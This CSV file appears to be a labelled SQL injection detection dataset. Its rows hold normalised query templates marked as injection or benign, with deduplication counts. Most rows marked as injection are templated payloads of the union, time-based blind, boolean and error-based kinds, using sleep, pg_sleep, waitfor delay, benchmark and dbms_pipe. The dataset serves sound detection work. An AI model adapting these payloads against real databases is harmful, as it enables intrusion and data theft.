template,label,original_count,kept,removed
"N' ) where N = N and N = ( select count ( * ) from A.A as t1,A.columns as t2,A.t",1,2,2,0
"N' ) where N = N and N = ( select count ( * ) from all_users t1,all_users t2,all",1,2,2,0
"N"" ) as A where N = N and N = N#",1,2,2,0
"N' ) where N = N and N = ( select count ( * ) from generate_series ( N,N ) ) --",1,2,2,0
"N'STR'A' where N = N and elt ( N = N,sleep ( N ) ) #",1,2,2,0
"-N"" ) or N group by concat ( HEX, ( select ( case when ( N = N ) then N else N e",1,2,2,0
"N"" ) as A where N = N and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ",1,2,2,0
N'STR'A' where N = N and sleep ( N ) #,1,2,2,0
"-N"" ) order by N#",1,2,2,0
"-N"" ) order by N--",1,2,2,0
"-N"" ) union all select N#",1,2,2,0
"-N"" ) union all select N,N#",1,2,2,0
"-N"" ) union all select N,N,N#",1,2,2,0
"-N"" ) union all select N,N,N,N#",1,2,2,0
"-N"" ) union all select N,N,N,N,N#",1,2,2,0
"-N"" ) union all select N,N,N,N,N,N#",1,2,2,0
"-N"" ) union all select N,N,N,N,N,N,N#",1,2,2,0
"-N"" ) union all select N,N,N,N,N,N,N,N#",1,2,2,0
"-N"" ) union all select N,N,N,N,N,N,N,N,N#",1,2,2,0
"-N"" ) union all select N,N,N,N,N,N,N,N,N,N#",1,2,2,0
"-N"" ) union all select N,N,N,N,N,N,N,N,N,N--",1,2,2,0
"-N"" ) union all select N,N,N,N,N,N,N,N,N--",1,2,2,0
"-N"" ) union all select N,N,N,N,N,N,N,N--",1,2,2,0
"-N"" ) union all select N,N,N,N,N,N,N--",1,2,2,0
"-N"" ) union all select N,N,N,N,N,N--",1,2,2,0
"-N"" ) union all select N,N,N,N,N--",1,2,2,0
"-N"" ) union all select N,N,N,N--",1,2,2,0
"-N"" ) union all select N,N,N--",1,2,2,0
"-N"" ) union all select N,N--",1,2,2,0
"-N"" ) union all select N--",1,2,2,0
"-N"" ) where N = N or ( N = N ) *N--",1,2,2,0
"N"" ) as A where N = N and N = like ( 'STR',upper ( hex ( randomblob ( N/N ) ) ) ",1,2,2,0
"A de A A, la",0,2,2,0
N' ) where N = N and N = N#,1,2,2,0
"-N"" ) where N = N or N = N#",1,2,2,0
A de A N,0,2,2,0
N ) where N = N waitfor delay 'STR'--,1,2,2,0
N ) ) and N = N#,1,2,2,0
N ) ) and N = N--,1,2,2,0
"-N"" ) where N = N or elt ( N = N,N ) --",1,2,2,0
"-N"" ) where N = N or make_set ( N = N,N ) --",1,2,2,0
N A ( select ( case when ( N = N ) then N else HEX end ) ) -- A,1,2,2,0
"N"" ) as A where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = re",1,2,2,0
"N"" ) as A where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = re",1,2,2,0
"N"" ) as A where N = N and elt ( N = N,N ) --",1,2,2,0
N'STR'A' where N = N or ( select * from ( select ( sleep ( N ) ) ) A ) #,1,2,2,0
N'STR'A' where N = N or N = ( select N from pg_sleep ( N ) ) --,1,2,2,0
"A de A, l'",0,2,2,0
"N"" ) as A where N = N and make_set ( N = N,N ) --",1,2,2,0
N' in A A ) and N = N--,1,2,2,0
N and ( N = N ) *N-- A,1,2,2,0
N' ) where N = N and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr,1,2,2,0
"N' in A A ) and N = benchmark ( N,md5 ( HEX ) ) #",1,2,2,0
"N'STR'A' where N = N or N = ( select count ( * ) from A as sys1,A as sys2,A as s",1,2,2,0
N'STR'A' from A where N = N and N = N#,1,2,2,0
N' ) where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_,1,2,2,0
N' ) where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_,1,2,2,0
"N"" ) as A where N = N or N = ( select N from pg_sleep ( N ) ) --",1,2,2,0
"A de la A, N,",0,2,2,0
N ) ) as A where N = N A ( select ( case when ( N = N ) then N else HEX end ) ) ,1,2,2,0
"N"" ) as A where N = N or N = ( select count ( * ) from A as sys1,A as sys2,A as ",1,2,2,0
"N"" ) as A where N = N or N = ( select count ( * ) from A$A as t1,A$A as t2,A$col",1,2,2,0
"-N"" where N = N or ( N = N ) *N--",1,2,2,0
"N"" ) as A where N = N or N = ( select count ( * ) from A.A as t1,A.columns as t2",1,2,2,0
A@A.ge,0,2,2,0
"N' ) where N = N and elt ( N = N,N ) --",1,2,2,0
"-N"" where N = N or N = N#",1,2,2,0
N ) ) as A where N = N and ( N = N ) *N--,1,2,2,0
"N"" ) as A where N = N or N = ( select count ( * ) from all_users t1,all_users t2",1,2,2,0
"N"" ) as A where N = N or N = ( select count ( * ) from generate_series ( N,N ) )",1,2,2,0
N'STR'A' from A where N = N and N = N--,1,2,2,0
N' ) as A where N = N A ( select ( case when ( N = N ) then N else HEX end ) ) -,1,2,2,0
"N"" ) as A where N = N or N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) |",1,2,2,0
"-N"" where N = N or elt ( N = N,N ) --",1,2,2,0
"-N"" where N = N or make_set ( N = N,N ) --",1,2,2,0
"N"" ) as A where N = N or N = like ( 'STR',upper ( hex ( randomblob ( N/N ) ) ) )",1,2,2,0
A@A.il,0,2,2,0
A el A de A,0,2,2,0
N ) ) as A where N = N and N = ( select N from pg_sleep ( N ) ) --,1,2,2,0
"N ) ) as A where N = N and N = ( select count ( * ) from A as sys1,A as sys2,A a",1,2,2,0
"N ) ) as A where N = N and N = ( select count ( * ) from A$A as t1,A$A as t2,A$c",1,2,2,0
"N ) ) as A where N = N and N = ( select count ( * ) from A.A as t1,A.columns as ",1,2,2,0
"N ) ) as A where N = N and N = ( select count ( * ) from all_users t1,all_users ",1,2,2,0
"N ) ) as A where N = N and N = ( select count ( * ) from generate_series ( N,N )",1,2,2,0
"N'STR'A' where N = N or N = ( select count ( * ) from A$A as t1,A$A as t2,A$coll",1,2,2,0
"N"" ) as A where N = N or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = reg",1,2,2,0
N ) ) as A where N = N and N = N#,1,2,2,0
A@A.mm,0,2,2,0
"N'STR'A' where N = N or N = ( select count ( * ) from A.A as t1,A.columns as t2,",1,2,2,0
"N'STR'A' where N = N or N = ( select count ( * ) from all_users t1,all_users t2,",1,2,2,0
"N' ) where N = N and make_set ( N = N,N ) --",1,2,2,0
N' ) as A where N = N and ( N = N ) *N--,1,2,2,0
N ) ) as A where N = N and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ),1,2,2,0
"N%"" ) ) and N = N#",1,2,2,0
"N ) ) as A where N = N and N = like ( 'STR',upper ( hex ( randomblob ( N/N ) ) )",1,2,2,0
"-N%"" ) ) ) or N = N#",1,2,2,0
"-N%"" ) ) ) or N = N--",1,2,2,0
"N%"" ) ) and N = N--",1,2,2,0
"N'STR'A' where N = N or N = ( select count ( * ) from generate_series ( N,N ) ) ",1,2,2,0
N ) ) as A where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = r,1,2,2,0
A@A.pf,0,2,2,0
N ) ) as A where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = r,1,2,2,0
"N ) ) as A where N = N and elt ( N = N,N ) --",1,2,2,0
N' where N = N A ( select ( case when ( N = N ) then N else HEX end ) ) --,1,2,2,0
N'+ ( select A where N = N and N = N#,1,2,2,0
N'+ ( select A where N = N and N = N--,1,2,2,0
"N'STR'A' where N = N or N = benchmark ( N,md5 ( HEX ) ) #",1,2,2,0
"N ) ) as A where N = N and make_set ( N = N,N ) --",1,2,2,0
A la A,0,2,2,0
N' ) as A where N = N and N = ( select N from pg_sleep ( N ) ) --,1,2,2,0
N and N = N#,1,2,2,0
N and N = N--,1,2,2,0
N and N = N-- A,1,2,2,0
"N' ) as A where N = N and N = ( select count ( * ) from A as sys1,A as sys2,A as",1,2,2,0
"N' ) as A where N = N and N = ( select count ( * ) from A$A as t1,A$A as t2,A$co",1,2,2,0
"N' ) as A where N = N and N = ( select count ( * ) from A.A as t1,A.columns as t",1,2,2,0
"N' in A A ) and elt ( N = N,N ) #",1,2,2,0
N ) ) as A where N = N or N = ( select N from pg_sleep ( N ) ) --,1,2,2,0
A lo A,0,2,2,0
A@N.fr,0,2,2,0
"N ) ) as A where N = N or N = ( select count ( * ) from A as sys1,A as sys2,A as",1,2,2,0
"N ) ) as A where N = N or N = ( select count ( * ) from A$A as t1,A$A as t2,A$co",1,2,2,0
"-N%"" ) ) or N = N#",1,2,2,0
"-N%"" ) ) or N = N--",1,2,2,0
"N ) ) as A where N = N or N = ( select count ( * ) from A.A as t1,A.columns as t",1,2,2,0
"N ) ) as A where N = N or N = ( select count ( * ) from all_users t1,all_users t",1,2,2,0
"N ) ) as A where N = N or N = ( select count ( * ) from generate_series ( N,N ) ",1,2,2,0
"N' ) as A where N = N and N = ( select count ( * ) from all_users t1,all_users t",1,2,2,0
"N' ) as A where N = N and N = ( select count ( * ) from generate_series ( N,N ) ",1,2,2,0
N ) ) as A where N = N or N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ,1,2,2,0
"N ) ) as A where N = N or N = like ( 'STR',upper ( hex ( randomblob ( N/N ) ) ) ",1,2,2,0
"N' in A A ) and elt ( N = N,sleep ( N ) ) #",1,2,2,0
N ) ) as A where N = N or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = re,1,2,2,0
N%' ) ) ) and N = N#,1,2,2,0
N%' ) ) ) and N = N--,1,2,2,0
N'STR'A' where N = N or N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||,1,2,2,0
N' ) as A where N = N and N = N#,1,2,2,0
A A A A N,0,2,2,0
N' ) where N = N or N = ( select N from pg_sleep ( N ) ) --,1,2,2,0
"N' ) where N = N or N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,",1,2,2,0
"N"" ) as A where N = N waitfor delay 'STR'--",1,2,2,0
"N"" ) ) and N = N#",1,2,2,0
"N"" ) ) and N = N--",1,2,2,0
"N' ) where N = N or N = ( select count ( * ) from A$A as t1,A$A as t2,A$collatio",1,2,2,0
"N' ) where N = N or N = ( select count ( * ) from A.A as t1,A.columns as t2,A.ta",1,2,2,0
N' ) as A where N = N and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ,1,2,2,0
"N' ) where N = N or N = ( select count ( * ) from all_users t1,all_users t2,all_",1,2,2,0
A A A A N N?h,0,2,2,0
"A A A A N,",0,2,2,0
"-N%"" ) or N = N#",1,2,2,0
"-N%"" ) or N = N--",1,2,2,0
A regexp_substring ( repeat ( left ( crypt_key ( char ( N ) ||char ( N ) ||char ,1,2,2,0
"N' ) where N = N or N = ( select count ( * ) from generate_series ( N,N ) ) --",1,2,2,0
N' where N = N and ( N = N ) *N--,1,2,2,0
"N and elt ( N = N,N ) -- A",1,2,2,0
N' ) as A where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = re,1,2,2,0
N' ) as A where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = re,1,2,2,0
A regexp_substring ( repeat ( left ( crypt_key ( char ( N ) ||char ( N ) ||char ,1,2,2,0
"N' ) as A where N = N and elt ( N = N,N ) --",1,2,2,0
"N' in A A ) and make_set ( N = N,N ) #",1,2,2,0
N' ) where N = N or N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr ,1,2,2,0
N'STR'A' where N = N or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = rege,1,2,2,0
N' ) ) as A where N = N A ( select ( case when ( N = N ) then N else HEX end ) ),1,2,2,0
A regexp_substring ( repeat ( left ( crypt_key ( char ( N ) ||char ( N ) ||char ,1,2,2,0
N ) ) as A where N = N waitfor delay 'STR'--,1,2,2,0
N' ) where N = N or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_s,1,2,2,0
"N' ) as A where N = N and make_set ( N = N,N ) --",1,2,2,0
N'STR'A' where N = N or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = rege,1,2,2,0
"N and make_set ( N = N,N ) -- A",1,2,2,0
A regexp_substring ( repeat ( left ( crypt_key ( char ( N ) ||char ( N ) ||char ,1,2,2,0
N' in A A ) or ( select * from ( select ( sleep ( N ) ) ) A ) #,1,2,2,0
N' ) ) as A where N = N and ( N = N ) *N--,1,2,2,0
"N'STR'A' where N = N or elt ( N = N,sleep ( N ) ) #",1,2,2,0
N'STR'A' where N = N or sleep ( N ) #,1,2,2,0
N'STR'A' where N = N order by N#,1,2,2,0
N' where N = N and N = ( select N from pg_sleep ( N ) ) --,1,2,2,0
"-N%"" or N = N#",1,2,2,0
"-N%"" or N = N--",1,2,2,0
"N"" where N = N A ( select ( case when ( N = N ) then N else HEX end ) ) --",1,2,2,0
"N' where N = N and N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,A",1,2,2,0
N' ) ) as A where N = N and N = ( select N from pg_sleep ( N ) ) --,1,2,2,0
"A regexp_substring ( repeat ( right ( char ( N ) ,N ) ,N ) ,null ) --",1,2,2,0
"N' ) ) as A where N = N and N = ( select count ( * ) from A as sys1,A as sys2,A ",1,2,2,0
"N' ) ) as A where N = N and N = ( select count ( * ) from A$A as t1,A$A as t2,A$",1,2,2,0
"N"" ) ) as A where N = N A ( select ( case when ( N = N ) then N else HEX end ) )",1,2,2,0
"N"" where N = N and ( N = N ) *N--",1,2,2,0
"N' ) ) as A where N = N and N = ( select count ( * ) from A.A as t1,A.columns as",1,2,2,0
"A regexp_substring ( repeat ( right ( char ( N ) ,N ) ,N ) ,null ) and 'STR' = '",1,2,2,0
"N' where N = N and N = ( select count ( * ) from A$A as t1,A$A as t2,A$collation",1,2,2,0
"N' ) ) as A where N = N and N = ( select count ( * ) from all_users t1,all_users",1,2,2,0
"N"" ) ) as A where N = N and ( N = N ) *N--",1,2,2,0
"N' ) ) as A where N = N and N = ( select count ( * ) from generate_series ( N,N ",1,2,2,0
N%' ) ) and N = N#,1,2,2,0
"A regexp_substring ( repeat ( right ( char ( N ) ,N ) ,N ) ,null ) and ( 'STR' =",1,2,2,0
N%' ) ) and N = N--,1,2,2,0
"N"" where N = N and N = ( select N from pg_sleep ( N ) ) --",1,2,2,0
"N"" where N = N and N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,A",1,2,2,0
"N"" where N = N and N = ( select count ( * ) from A$A as t1,A$A as t2,A$collation",1,2,2,0
"N"" ) ) as A where N = N and N = ( select N from pg_sleep ( N ) ) --",1,2,2,0
"A regexp_substring ( repeat ( right ( char ( N ) ,N ) ,N ) ,null ) and ( ( 'STR'",1,2,2,0
"N"" ) ) as A where N = N and N = ( select count ( * ) from A as sys1,A as sys2,A ",1,2,2,0
"N"" ) ) as A where N = N and N = ( select count ( * ) from A$A as t1,A$A as t2,A$",1,2,2,0
"N"" ) ) as A where N = N and N = ( select count ( * ) from A.A as t1,A.columns as",1,2,2,0
-N%' ) ) ) or N = N#,1,2,2,0
-N%' ) ) ) or N = N--,1,2,2,0
"N"" ) ) as A where N = N and N = ( select count ( * ) from all_users t1,all_users",1,2,2,0
"N"" ) ) as A where N = N and N = ( select count ( * ) from generate_series ( N,N ",1,2,2,0
"A regexp_substring ( repeat ( right ( char ( N ) ,N ) ,N ) ,null ) and ( ( ( 'ST",1,2,2,0
"N"" where N = N and N = ( select count ( * ) from A.A as t1,A.columns as t2,A.tab",1,2,2,0
N' ) as A where N = N or N = ( select N from pg_sleep ( N ) ) --,1,2,2,0
"N"" ) ) as A where N = N and N = N#",1,2,2,0
"N"" ) where N = N and make_set ( N = N,N ) --",1,2,2,0
"N"" where N = N and N = ( select count ( * ) from all_users t1,all_users t2,all_u",1,2,2,0
"N"" where N = N and N = ( select count ( * ) from generate_series ( N,N ) ) --",1,2,2,0
"N' ) as A where N = N or N = ( select count ( * ) from A as sys1,A as sys2,A as ",1,2,2,0
"N"" where N = N or N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr ( ",1,2,2,0
N' ) ) as A where N = N and N = N#,1,2,2,0
"N"" ) ) as A where N = N and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ",1,2,2,0
"N"" where N = N and N = N#",1,2,2,0
"N"" ) ) as A where N = N and N = like ( 'STR',upper ( hex ( randomblob ( N/N ) ) ",1,2,2,0
N where N = N and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr ( ,1,2,2,0
"N"" where N = N or N = like ( 'STR',upper ( hex ( randomblob ( N/N ) ) ) ) --",1,2,2,0
"N"" ) ) as A where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = ",1,2,2,0
"N"" ) ) as A where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = ",1,2,2,0
"N"" ) ) as A where N = N and elt ( N = N,N ) --",1,2,2,0
"N' ) as A where N = N or N = ( select count ( * ) from A$A as t1,A$A as t2,A$col",1,2,2,0
"N' where N = N and N = ( select count ( * ) from A.A as t1,A.columns as t2,A.tab",1,2,2,0
"N' ) as A where N = N or N = ( select count ( * ) from all_users t1,all_users t2",1,2,2,0
-N%' ) ) or N = N#,1,2,2,0
-N%' ) ) or N = N--,1,2,2,0
"N"" where N = N and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr (",1,2,2,0
"N"" ) ) as A where N = N and make_set ( N = N,N ) --",1,2,2,0
"N' ) as A where N = N or N = ( select count ( * ) from generate_series ( N,N ) )",1,2,2,0
"N"" where N = N and N = like ( 'STR',upper ( hex ( randomblob ( N/N ) ) ) ) --",1,2,2,0
N' ) ) as A where N = N and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ,1,2,2,0
"N' where N = N and N = ( select count ( * ) from all_users t1,all_users t2,all_u",1,2,2,0
"N"" ) where N = N A ( select ( case when ( N = N ) then N else HEX end ) ) --",1,2,2,0
"N"" where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_su",1,2,2,0
"N"" where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_su",1,2,2,0
"N"" where N = N and elt ( N = N,N ) --",1,2,2,0
"N"" ) ) as A where N = N or N = ( select N from pg_sleep ( N ) ) --",1,2,2,0
"N"" ) ) as A where N = N or N = ( select count ( * ) from A as sys1,A as sys2,A a",1,2,2,0
"N"" ) ) as A where N = N or N = ( select count ( * ) from A$A as t1,A$A as t2,A$c",1,2,2,0
N ) and N = N#,1,2,2,0
N ) and N = N--,1,2,2,0
"N"" ) ) as A where N = N or N = ( select count ( * ) from A.A as t1,A.columns as ",1,2,2,0
"N where N = N and N = like ( 'STR',upper ( hex ( randomblob ( N/N ) ) ) ) --",1,2,2,0
"N' where N = N and N = ( select count ( * ) from generate_series ( N,N ) ) --",1,2,2,0
"N"" ) ) as A where N = N or N = ( select count ( * ) from all_users t1,all_users ",1,2,2,0
"N"" ) ) as A where N = N or N = ( select count ( * ) from generate_series ( N,N )",1,2,2,0
"N"" ) where N = N and ( N = N ) *N--",1,2,2,0
N' ) as A where N = N or N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) |,1,2,2,0
"N"" ) ) as A where N = N or N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N )",1,2,2,0
-N%' ) or N = N#,1,2,2,0
-N%' ) or N = N--,1,2,2,0
"N"" ) ) as A where N = N or N = like ( 'STR',upper ( hex ( randomblob ( N/N ) ) )",1,2,2,0
N' ) ) as A where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = ,1,2,2,0
"N"" ) ) as A where N = N or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = r",1,2,2,0
N' ) ) as A where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = ,1,2,2,0
"N"" where N = N and make_set ( N = N,N ) --",1,2,2,0
"N' ) ) as A where N = N and elt ( N = N,N ) --",1,2,2,0
N'STR'A' where N = N order by N--,1,2,2,0
"N"" ) where N = N and N = ( select N from pg_sleep ( N ) ) --",1,2,2,0
"N"" ) where N = N and N = ( select count ( * ) from A as sys1,A as sys2,A as sys3",1,2,2,0
"N"" ) where N = N and N = ( select count ( * ) from A$A as t1,A$A as t2,A$collati",1,2,2,0
"N"" ) where N = N and N = ( select count ( * ) from A.A as t1,A.columns as t2,A.t",1,2,2,0
A$A,0,2,2,0
N' ) as A where N = N or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = reg,1,2,2,0
"N"" ) where N = N and N = ( select count ( * ) from all_users t1,all_users t2,all",1,2,2,0
"N"" ) where N = N and N = ( select count ( * ) from generate_series ( N,N ) ) --",1,2,2,0
"N'STR'A' where N = N procedure A ( extractvalue ( N,concat ( HEX, ( benchmark ( ",1,2,2,0
N' where N = N and N = N#,1,2,2,0
"N"" ) where N = N and N = N#",1,2,2,0
N waitfor delay 'STR'--,1,2,2,0
"N'STR'A' where N = N union all select null,null#",1,2,2,0
"N%"" ) and N = N#",1,2,2,0
"N%"" ) and N = N--",1,2,2,0
N ) as A where N = N A ( select ( case when ( N = N ) then N else HEX end ) ) --,1,2,2,0
"N"" where N = N or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_sub",1,2,2,0
-N%' or N = N#,1,2,2,0
-N%' or N = N--,1,2,2,0
N ) as A where N = N or N = ( select N from pg_sleep ( N ) ) --,1,2,2,0
A A A N N-d,0,2,2,0
N where N = N A ( select ( case when ( N = N ) then N else HEX end ) ) --,1,2,2,0
"N ) as A where N = N or N = ( select count ( * ) from A as sys1,A as sys2,A as s",1,2,2,0
"N' ) ) as A where N = N and make_set ( N = N,N ) --",1,2,2,0
"N"" where N = N or N = ( select N from pg_sleep ( N ) ) --",1,2,2,0
A+A,0,2,2,0
"N"" ) where N = N and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr",1,2,2,0
N ) as A where N = N and ( N = N ) *N--,1,2,2,0
"N ) as A where N = N or N = ( select count ( * ) from A$A as t1,A$A as t2,A$coll",1,2,2,0
"N ) as A where N = N or N = ( select count ( * ) from A.A as t1,A.columns as t2,",1,2,2,0
"N"" where N = N or N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,A ",1,2,2,0
N where N = N and ( N = N ) *N--,1,2,2,0
"N"" ) where N = N and N = like ( 'STR',upper ( hex ( randomblob ( N/N ) ) ) ) --",1,2,2,0
"N"" where N = N or N = ( select count ( * ) from A$A as t1,A$A as t2,A$collations",1,2,2,0
"A, N N?c",0,2,2,0
"N"" where N = N or N = ( select count ( * ) from A.A as t1,A.columns as t2,A.tabl",1,2,2,0
"N"" ) where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_",1,2,2,0
"A, N N?g",0,2,2,0
N ) as A where N = N and N = ( select N from pg_sleep ( N ) ) --,1,2,2,0
â or N = N --,1,2,2,0
"N ) as A where N = N and N = ( select count ( * ) from A as sys1,A as sys2,A as ",1,2,2,0
"N ) as A where N = N and N = ( select count ( * ) from A$A as t1,A$A as t2,A$col",1,2,2,0
"N ) as A where N = N or N = ( select count ( * ) from all_users t1,all_users t2,",1,2,2,0
‘ or N = N --,1,2,2,0
"N ) as A where N = N or N = ( select count ( * ) from generate_series ( N,N ) ) ",1,2,2,0
N where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_sub,1,2,2,0
( select * from ( select ( sleep ( N ) ) ) A ),1,2,2,0
( select * from ( select ( sleep ( N ) ) ) A ) #,1,2,2,0
N where N = N and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_sub,1,2,2,0
N ) as A where N = N or N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||,1,2,2,0
( select * from ( select ( sleep ( N ) ) ) A ) and 'STR' = 'A,1,2,2,0
( select * from ( select ( sleep ( N ) ) ) A ) and ( 'STR' = 'A,1,2,2,0
( select * from ( select ( sleep ( N ) ) ) A ) and ( ( 'STR' = 'A,1,2,2,0
( select * from ( select ( sleep ( N ) ) ) A ) and ( ( ( 'STR' = 'A,1,2,2,0
-N' ) where N = N or ( N = N ) *N--,1,2,2,0
"A A A N, N?b",0,2,2,0
"N ) as A where N = N or N = like ( 'STR',upper ( hex ( randomblob ( N/N ) ) ) ) ",1,2,2,0
-N' ) where N = N or N = N#,1,2,2,0
( select char ( N ) +char ( N ) +char ( N ) +char ( N ) +char ( N ) + ( select (,1,2,2,0
"N where N = N and elt ( N = N,N ) --",1,2,2,0
N ) as A where N = N or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = rege,1,2,2,0
( select productid from orderdetails where A > N ) ;,0,2,2,0
"N' in A A ) or N = benchmark ( N,md5 ( HEX ) ) #",1,2,2,0
"N'STR'A' where N = N union all select null,null,null#",1,2,2,0
"N'STR'A' where N = N union all select null,null,null,null#",1,2,2,0
"-N' ) where N = N or elt ( N = N,N ) --",1,2,2,0
"-N' ) where N = N or make_set ( N = N,N ) --",1,2,2,0
N' where N = N and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr (,1,2,2,0
-N' ) ) as A where N = N or ( N = N ) *N--,1,2,2,0
